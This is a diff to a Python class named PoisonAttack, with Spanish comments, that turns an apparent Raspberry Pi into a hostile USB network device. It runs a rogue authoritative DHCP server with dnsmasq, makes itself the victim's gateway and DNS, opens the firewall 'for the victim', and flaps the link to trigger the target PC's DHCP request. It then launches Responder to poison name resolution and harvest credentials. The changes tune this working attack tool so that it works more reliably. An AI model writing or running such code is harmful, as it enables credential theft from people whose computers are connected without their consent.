@@ -75,76 +75,81 @@ class PoisonAttack:
         self.log(f"[*] Configurando interfaz: {iface}")
 
         try:
-            self.log("[*] Desvinculando interfaz de gestores de red...")
+            self.log("[*] Desvinculando interfaz de gestores de red locales...")
             os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
             os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
-            time.sleep(1)
-
-            # Preparar la interfaz UNA SOLA VEZ antes de los servicios
-            self.log("[*] Reset de interfaz...")
-            os.system(f"sudo ip link set {iface} down 2>/dev/null")
-            time.sleep(1)
-            os.system(f"sudo ip link set {iface} up")
             time.sleep(1)
 
             ip = "192.168.10.1"
             subnet_mask = "24"
             ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
 
-            self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
+            # 1. Primera asignación (Para que los servicios tengan donde anclarse)
+            self.log(f"[*] Preparando IP estática {ip}/{subnet_mask}...")
             os.system(f"sudo ip addr flush dev {iface} 2>/dev/null")
-            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")
+            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface} 2>/dev/null")
+            os.system(f"sudo ip link set {iface} up")
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
-            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
 
-            # REGLA MAESTRA: Permitir TODO el tráfico en la interfaz USB
-            # Esto es vital para que Linux no desconecte la red al fallar los pings de comprobación
-            self.log("[*] Configurando firewall para Responder y DHCP...")
+            # 2. Abrir Firewall sin restricciones para la interfaz USB
+            self.log("[*] Abriendo firewall para la víctima...")
             os.system(f"sudo iptables -A INPUT -i {iface} -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -j ACCEPT")
 
-            # Configuración dnsmasq (DHCP ultra-agresivo para Linux/Windows)
+            # 3. Configurar y arrancar dnsmasq ANTES de reiniciar el cable
             os.system("rm -f /tmp/dnsmasq.leases")
             
             config_dhcp = (
                 f"interface={iface}\n"
                 f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
-                f"dhcp-option=3,{ip}\n"        # Puerta de enlace (La Raspberry)
-                f"dhcp-option=6,{ip}\n"        # DNS (La Raspberry - Responder escuchará esto)
+                f"dhcp-option=3,{ip}\n"
+                f"dhcp-option=6,{ip}\n"
                 f"dhcp-option=15,\n"
                 f"dhcp-option=252,\n"
-                f"bind-dynamic\n"              # Fundamental para que no colapse si la red parpadea
+                f"bind-dynamic\n"              # Clave: Se mantiene vivo aunque la red se reinicie
                 f"dhcp-leasefile=/tmp/dnsmasq.leases\n"
-                f"dhcp-authoritative\n"        # Obliga a NetworkManager a aceptar la IP sin dudar
+                f"dhcp-authoritative\n"        # Impone la IP rápidamente a NetworkManager
                 f"no-resolv\n"
                 f"no-hosts\n"
-                f"port=0\n"                    # Apaga el DNS de dnsmasq para que Responder tome el puerto 53
+                f"port=0\n"                    # Apaga el DNS interno de dnsmasq a favor de Responder
                 f"log-dhcp\n"
             )
 
             with open("dnsmasq_temp.conf", "w") as f:
                 f.write(config_dhcp)
 
-            self.log("[*] Iniciando dnsmasq...")
+            self.log("[*] Iniciando dnsmasq (DHCP)...")
             self.dns_proc = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
             )
+            # Damos 2 segundos para que dnsmasq empiece a escuchar activamente
             time.sleep(2)
 
-            # Verificación de fallo en dnsmasq
+            # Verificar si dnsmasq falló
             if self.dns_proc.poll() is not None:
                 err = self.dns_proc.stderr.read()
-                self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
+                self.log(f"[!] dnsmasq falló, reintentando: {err.strip()}")
                 self.dns_proc = subprocess.Popen(
                     ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                 )
-            else:
-                self.log("[+] dnsmasq escuchando correctamente.")
 
+            # 4. EL "FLAP" MÁGICO (Reinicio físico virtual)
+            # Ahora que dnsmasq YA ESTÁ LISTO, tiramos el "cable" y lo volvemos a conectar.
+            # Esto soluciona que la PC víctima se haya rendido si la Pi se conectó hace rato.
+            self.log("[*] Despertando a la máquina víctima (Flap de cable)...")
+            os.system(f"sudo ip link set {iface} down")
+            time.sleep(1.5) # Espera necesaria para que el OS de la laptop registre la desconexión
+            
+            # Linux a veces borra la IP al hacer 'down', así que la reponemos al hacer 'up'
+            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface} 2>/dev/null")
+            os.system(f"sudo ip link set {iface} up")
+            time.sleep(1)
+
+            # 5. Iniciar Responder
             responder_paths = [
                 "/usr/share/responder/Responder.py",
                 "/opt/Responder/Responder.py"
@@ -159,7 +164,7 @@ class PoisonAttack:
 
             self.log(f"[+] INTERFAZ LISTA: {iface}")
             self.log(f"[+] IP: {ip}/{subnet_mask}")
-            self.log(f"[+] Conecta ahora la víctima al puerto USB")
+            self.log(f"[+] Si la PC estaba dormida, acaba de recibir la petición DHCP.")
 
             self.proc_responder = subprocess.Popen(
                 responder_cmd,
@@ -169,9 +174,7 @@ class PoisonAttack:
                 bufsize=1
             )
 
-            # ¡OJO AQUÍ! Hemos ELIMINADO el ciclo "down/up" que tiraba la red. 
-            # La interfaz ya está UP y con IP, lista para que la PC víctima despierte.
-
+            # Ciclo de lectura de Responder
             while not self.stop_event.is_set():
                 linea = self.proc_responder.stdout.readline()
                 if not linea and self.proc_responder.poll() is not None:
@@ -184,7 +187,8 @@ class PoisonAttack:
         finally:
             self._cleanup()
 
-
+   
+   
     def _cleanup(self):
         self.log("\n[*] Deteniendo procesos y restaurando red...")
         if self.dns_proc:
